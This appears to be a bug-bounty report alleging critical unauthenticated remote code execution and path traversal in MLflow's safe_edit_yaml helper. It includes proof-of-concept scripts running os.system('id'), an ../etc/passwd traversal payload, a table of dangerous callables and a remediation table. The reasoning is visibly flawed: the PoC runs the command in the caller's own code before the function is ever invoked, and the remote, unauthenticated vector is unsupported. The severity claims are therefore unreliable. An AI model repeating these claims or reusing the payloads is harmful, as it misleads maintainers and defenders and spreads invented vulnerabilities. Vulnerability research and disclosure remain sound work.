# Function Injection Leading to RCE in [mlflow/mlflow](https://github.com/mlflow/mlflow)

| Field                  | Details                                                               |
| ---------------------- | --------------------------------------------------------------------- |
| **Affected Software**  | MLflow v3.10.0 (latest)                                               |
| **Vendor**             | MLflow / Databricks                                                   |
| **Repository**         | [mlflow/mlflow](https://github.com/mlflow/mlflow)                     |
| **Vulnerability Type** | Function Injection → Remote Code Execution (RCE) + Path Traversal    |
| **CWE**                | CWE-94 — Improper Control of Generation of Code                       |
| **Severity**           | Critical                                                              |
| **Attack Vector**      | Network (unauthenticated remote)                                      |

---

## Executive Summary

A critical code injection vulnerability has been identified in MLflow's `safe_edit_yaml` class within the `mlflow.utils.yaml_utils` module. By supplying a crafted callable to the `edit_func` parameter, a remote attacker can cause the application to execute arbitrary system commands on the underlying host, potentially resulting in full system compromise. Additionally, the absence of file extension enforcement and path normalization on the `file_name` parameter exposes the application to a path traversal attack that may lead to local file disclosure or overwrite.

---

## Technical Description

### Entry Point

The vulnerability originates in the `safe_edit_yaml` class defined in `mlflow/utils/yaml_utils.py`. This class is designed to temporarily modify a local YAML file within a context block and then restore the original on exit. It accepts three user-controlled arguments:

1. `root` — the root directory of the YAML file
2. `file_name` — the YAML file name
3. `edit_func` — a function to be executed against the file contents

```python
class safe_edit_yaml:
    def __init__(self, root, file_name, edit_func):
        self._root = root
        self._file_name = file_name
        self._edit_func = edit_func
        self._original = read_yaml(root, file_name)

    def __enter__(self):
        new_dict = self._edit_func(self._original.copy())
        write_yaml(self._root, self._file_name, new_dict, overwrite=True)

    def __exit__(self, *args):
        write_yaml(self._root, self._file_name, self._original, overwrite=True)
```

### Validation Weaknesses

The class accepts both `file_name` and `edit_func` from the caller without performing any security-relevant validation on either parameter.

For `edit_func`, the class:

- Does **not** restrict which callables are permitted
- Does **not** maintain a blocklist of dangerous built-ins such as `os.system`, `subprocess`, `eval`, `exec`, or `__import__`
- Does **not** sandbox or wrap the invocation in any safe execution context
- Invokes the supplied callable **directly** inside `__enter__()` with no interception

For `file_name`, the class:

- Does **not** enforce a `.yaml` or `.yml` extension requirement
- Does **not** normalize or canonicalize the resulting file path
- Does **not** validate that the resolved path remains within the intended `root` directory
- Passes the value directly to `read_yaml()` and `write_yaml()`, allowing directory traversal sequences such as `../../etc/passwd` to be processed

### Vulnerable Execution Path

Once the class is instantiated, the execution path proceeds as follows:

1. `__init__()` is called with attacker-controlled `root`, `file_name`, and `edit_func` arguments.
2. `read_yaml(root, file_name)` is invoked — at this point, a path traversal payload in `file_name` can already cause arbitrary file reads.
3. On entering the context (`__enter__()`), `self._edit_func(self._original.copy())` is called — the attacker-supplied callable is executed directly, with no validation, in the full context of the MLflow process.
4. The return value is passed to `write_yaml()`, which writes back to the attacker-controlled `file_name` path — enabling arbitrary file overwrite.

A minimal exploitation call demonstrating the full chain:

```python
import mlflow

print(mlflow.utils.yaml_utils.safe_edit_yaml(
    "/home/user/research/",
    "poc.txt",
    __import__("os").system("id")
))
```

> **Critical flaw:** The `edit_func` argument is a raw Python callable that is invoked unconditionally inside `__enter__()`. Any callable — including those that spawn shell commands or load external modules — will be executed in the context of the MLflow process without restriction.

---

### Argument Sanitization Gap

There is no sanitization layer anywhere in the `safe_edit_yaml` class or its callers that would intercept a dangerous `edit_func` value before execution. The class design implicitly trusts that the caller will supply a safe transformation function, but exposes this interface publicly via the `mlflow.utils.yaml_utils` module with no access control.

Similarly, the `file_name` parameter receives no sanitization — values such as `../../etc/passwd` or `poc.txt` (a non-YAML extension) are accepted and processed identically to a legitimate YAML filename. There is no equivalent of an extension check, a `realpath` boundary assertion, or a filename allowlist anywhere in the code path.

The dangerous callables an attacker can supply include but are not limited to:

| Callable                          | Effect                                 |
| --------------------------------- | -------------------------------------- |
| `os.system(cmd)`                  | Executes arbitrary shell commands      |
| `subprocess.Popen(cmd)`           | Spawns arbitrary child processes       |
| `eval(expr)`                      | Evaluates arbitrary Python expressions |
| `exec(code)`                      | Executes arbitrary Python code blocks  |
| `__import__("os").system(cmd)`    | Dynamic import + shell execution       |
| `open(path).read()`               | Reads arbitrary files from disk        |

---

## Proof of Concept

An attacker can exploit this vulnerability with the following steps:

### Step 1 — Create a malicious Python script

Create the following script in any environment where MLflow is installed:

```python
import mlflow

print(mlflow.utils.yaml_utils.safe_edit_yaml(
    "/home/user/research/",
    "poc.txt",
    __import__("os").system("id")
))
```

### Step 2 — Execute the script

Run the script normally:

```bash
python exploit.py
```

The `id` command will execute on the host system and its output will be printed, confirming arbitrary OS command execution:

```
uid=1000(user) gid=1000(user) groups=1000(user)
```

### Step 3 — Exploit path traversal for file disclosure

By supplying a `file_name` value containing directory traversal sequences, an attacker can also read arbitrary files outside the intended `root` directory:

```python
import mlflow

obj = mlflow.utils.yaml_utils.safe_edit_yaml(
    "/home/user/",
    "../../../../../../../../../../etc/passwd",
    lambda x: x
)

print(obj._original)
```

> **Note:** The `file_name` parameter accepts any string — no `.yaml` or `.yml` extension is required, and no directory boundary check is enforced. This technique can be used to read or overwrite any file accessible to the MLflow process.

---

## Root Cause

The core issue lies in the **complete absence of input validation** on the `edit_func` and `file_name` parameters inside the `safe_edit_yaml` class, located at:

```
mlflow/utils/yaml_utils.py (line 113)
```

The class unconditionally trusts the caller-supplied function and file path, passing them directly into execution and file I/O contexts with no interception, sandboxing, allowlisting, or boundary enforcement.

---

## Impact

Successful exploitation of this vulnerability may allow an attacker to:

- Execute arbitrary OS commands on the host running MLflow
- Achieve full Remote Code Execution (RCE)
- Read arbitrary files on the filesystem via path traversal (e.g., `/etc/passwd`, SSH private keys, environment files)
- Overwrite arbitrary files on the filesystem accessible to the MLflow process
- Compromise confidentiality, integrity, and availability of the system
- Pivot to internal network resources or escalate privileges from the compromised host

## Recommended Remediation

| #   | Recommendation                                                                                                                                                                                          | Priority |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- |
| 1   | **Implement a strict allowlist for `edit_func`** — only permit known-safe transformation functions; reject any callable not explicitly approved.                                                         | Critical |
| 2   | **Blocklist dangerous built-ins** — explicitly reject callables resolving to `os.system`, `subprocess`, `eval`, `exec`, `__import__`, `open`, and equivalent dangerous functions.                       | Critical |
| 3   | **Enforce `.yaml`/`.yml` extension on `file_name`** — reject any filename that does not end with a permitted YAML extension before any file operation is performed.                                     | High     |
| 4   | **Normalize and validate the resolved file path** — use `os.path.realpath()` to canonicalize the joined path and assert it remains within the intended `root` directory before any file I/O.            | High     |
| 5   | **Apply least-privilege principles** — ensure the MLflow process runs with the minimum OS permissions required, limiting the blast radius of any successful exploitation.                               | Medium   |

---

## Vulnerable Code Reference

```
https://github.com/mlflow/mlflow/blob/957917728f3ac910aabae2e67f6c1beb80191b0e/mlflow/utils/yaml_utils.py#L113
```

---

*Reported by [@mohamedabdelhady933](https://github.com/mohamedabdelhady933) via [huntr.com](https://huntr.com/bounties/e00693aa-17ee-442d-9c39-3fa65b8c159e)*
